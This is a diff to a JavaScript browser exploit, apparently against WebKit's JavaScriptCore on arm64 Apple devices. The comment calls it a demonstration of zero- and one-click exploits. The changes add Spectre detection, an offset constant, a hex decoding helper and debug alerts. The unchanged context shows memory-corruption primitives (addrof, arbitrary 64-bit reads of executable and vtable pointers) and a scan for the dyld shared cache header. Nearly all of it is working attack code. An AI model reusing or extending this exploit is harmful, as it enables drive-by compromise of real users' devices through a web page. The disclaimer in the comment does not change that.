@@ -8,6 +8,8 @@
  * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
  * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any codesignature requirements.
 */
+var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
+var FPO = spectre ? 0x18 : 0x10;
 var VM_PROT_NONE = 0x0
 var VM_PROT_READ = 0x1
 var VM_PROT_WRITE = 0x2
@@ -527,6 +529,7 @@ function exploit(){
         var d = document.createElement('div');
         let ad_div = addrof(d);
         log('[+] Address of the div is '+ad_div.toString(16));
+        alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
@@ -543,6 +546,14 @@ function exploit(){
        // log('[+] And thus the JavaScriptCore base is '+jbase.toString(16));
         //var magic =  r32(base);
         //log('[+] Which has magic '+magic.toString(16));
+        function hex2a(hex) {
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2) {
+        var v = parseInt(hex.substr(i, 2), 16);
+        if (v) str += String.fromCharCode(v);
+    }
+    return str;
+}  
         function _u32(i)
     {
         return b2u32(this.read(i, 4));
@@ -556,7 +567,7 @@ function exploit(){
         while(true)
         {
         if (memory.readInt64(hdr).lo() == 4277009104) {
-          alert('WebCore ' + hdr + ' post spectre support coming soon');
+          alert('WebCore ' + hdr + ' post spectre support coming soon...mightnotwork');
         }
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
         {
@@ -566,6 +577,7 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
+        alert('magic' + hex2a(memory.u32(hdr)))
         var base_seg = null;
         var nsegs    = memory.u32(Add(hdr, 0x14));
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
